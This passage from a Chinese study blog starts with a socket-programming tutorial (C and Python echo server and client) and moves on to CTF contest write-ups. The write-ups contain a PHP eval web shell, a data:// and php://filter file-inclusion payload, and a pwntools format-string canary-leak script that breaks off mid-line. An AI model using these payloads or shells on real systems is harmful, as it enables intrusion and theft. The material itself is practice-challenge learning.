title="套接字编程"></a>套接字编程</h4><p>套接字是一个指向传输提供者的句柄，分为三类</p><ul><li>原始套接字：让程序开发人员能够控制底层网络传输机制，接收的数据包含<code>IP</code>头</li><li>流式套接字：提供双向、有序、可靠的数据传输服务，通信前需要双方建立连接，例如<code>TCP</code>协议</li><li>数据包套接字：提供双向的数据流，不保证可靠、有序、无重复，例如<code>UDP</code>协议</li></ul><p>服务器端：</p><ul><li><p>创建套接字<code>socket</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">socket</span><span class="token punctuation">(</span><span class="token keyword">int</span> af<span class="token punctuation">,</span> <span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">int</span> protocol<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>type</code>：<code>SOCK_STREAM</code>流式套接字，<code>SOCK_DGRAM</code>无连接的数据报套接字，<code>SOCK_RAW</code>原始套接字</p></li><li><p>绑定<code>bind</code>到本地的地址和端口</p></li><li><p>设置套接字为监听状态<code>listen</code></p></li><li><p>接收请求<code>accept</code>，返回得到一个用于请求的新套接字</p></li><li><p>使用新套接字进行通信<code>send/recv</code></p></li><li><p>释放套接字资源<code>closesocket</code></p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PORT</span> <span class="token expression"><span class="token number">8080</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAXBUFLEN</span> <span class="token expression"><span class="token number">100</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> server_fd<span class="token punctuation">,</span> new_socket<span class="token punctuation">,</span> valread<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> address<span class="token punctuation">;</span>    <span class="token keyword">int</span> opt <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> addrlen <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span>MAXBUFLEN<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>message <span class="token operator">=</span> <span class="token string">"Echo: "</span><span class="token punctuation">;</span>    <span class="token comment">// 创建套接字文件描述符</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>server_fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"socket failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 绑定套接字到端口</span>    address<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    address<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> INADDR_ANY<span class="token punctuation">;</span>    address<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>PORT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>server_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>address<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"bind failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 监听端口</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">listen</span><span class="token punctuation">(</span>server_fd<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"listen"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Server listening on port %d...\n"</span><span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 接受连接</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>new_socket <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>server_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>address<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">socklen_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>addrlen<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"accept"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 读取数据</span>    valread <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>new_socket<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> MAXBUFLEN<span class="token punctuation">)</span><span class="token punctuation">;</span>    buffer<span class="token punctuation">[</span>valread<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>    <span class="token comment">// 发送数据</span>    <span class="token function">send</span><span class="token punctuation">(</span>new_socket<span class="token punctuation">,</span> message<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">send</span><span class="token punctuation">(</span>new_socket<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 关闭套接字</span>    <span class="token function">close</span><span class="token punctuation">(</span>new_socket<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>server_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python版：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sockethost <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span>port <span class="token operator">=</span> <span class="token number">8080</span>server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token comment"># 设置选项，允许重新使用地址，这在重启服务器时可以避免等待</span>server_socket<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Server is listening on </span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 接受客户端的连接</span>    client_socket<span class="token punctuation">,</span> addr <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connected by </span><span class="token interpolation"><span class="token punctuation">&#123;</span>addr<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token comment"># 接收客户端发送的数据</span>    message <span class="token operator">=</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Received from client: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>message<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token comment"># 发送数据给客户端</span>    client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Echo: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>message<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 关闭与客户端的连接</span>    client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>客户端：</p><ul><li>创建套接字<code>socket</code></li><li>向服务器发送连接请求<code>connect</code></li><li>与服务器进行通信<code>send/recv</code></li><li>释放套接字资源<code>closesocket</code></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PORT</span> <span class="token expression"><span class="token number">8080</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sock <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> valread<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> serv_addr<span class="token punctuation">;</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span>MAXBUFLEN<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>message <span class="token operator">=</span> <span class="token string">"Hello from client"</span><span class="token punctuation">;</span>    <span class="token comment">// 创建套接字文件描述符</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sock <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"socket creation failed...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 设置服务器地址参数</span>    serv_addr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    serv_addr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>PORT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 将点分十进制IP地址转换为二进制形式</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">inet_pton</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>serv_addr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Invalid address/ Address not supported \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 连接到服务器</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">connect</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>serv_addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>serv_addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"connection with the server failed...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 发送数据</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">send</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> message<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Send failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 接收数据</span>    valread <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> MAXBUFLEN<span class="token punctuation">)</span><span class="token punctuation">;</span>    buffer<span class="token punctuation">[</span>valread<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Server: %s\n"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 关闭套接字</span>    <span class="token function">close</span><span class="token punctuation">(</span>sock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python版</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sockethost <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span>port <span class="token operator">=</span> <span class="token number">8080</span>client_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>client_socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 发送数据到服务器</span>client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"Hello from client"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 接收服务器返回的数据</span>response <span class="token operator">=</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Received from server: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-17"><a href="#8-17" class="headerlink" title="#8.17"></a>#8.17</h2><p>极客巅峰一题不会唉，写了点新生赛的<code>web</code>和<code>pwn</code></p><h3 id="EncirclingGame"><a href="#EncirclingGame" class="headerlink" title="EncirclingGame"></a>EncirclingGame</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">A simple game<span class="token punctuation">,</span> enjoy it <span class="token keyword">and</span> get the flag when you complete it<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>纯游戏题，通关得到<code>flag</code></p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>文件上传漏洞，没有检测文件类型，直接传个木马，然后蚁剑连接</p><p><code>test.php</code>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Aura酱的礼物"><a href="#Aura酱的礼物" class="headerlink" title="Aura酱的礼物"></a>Aura酱的礼物</h3><p><code>data</code>伪协议 <code>ssrf</code> 文件包含</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Aura 酱，欢迎回家~</span><span class="token comment">// 这里有一份礼物，请你签收一下哟~</span><span class="token variable">$pen</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pen'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$pen</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Aura'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这是 Aura 的礼物，你不是 Aura！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span><span class="token variable">$challenge</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://jasmineaura.github.io'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这不是 Aura 的博客！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$blog_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$blog_content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'已经收到Kengwang的礼物啦'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'请去博客里面写下感想哦~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span><span class="token variable">$gift</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gift'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$gift</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>post</code>参数：<code>pen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@challenge.basectf.fun:21758/&amp;gift=php://filter/convert.base64-encode/resource=flag.php</code></p><h3 id="leak-sth"><a href="#leak-sth" class="headerlink" title="leak_sth"></a>leak_sth</h3><p>格式化字符串泄露<code>canary</code>，伪随机数绕过，触发后门</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>seed <span class="token operator">=</span> libc<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>v3 <span class="token operator">=</span> libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'%13$p'</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'name'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'number'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>v3<span class="token 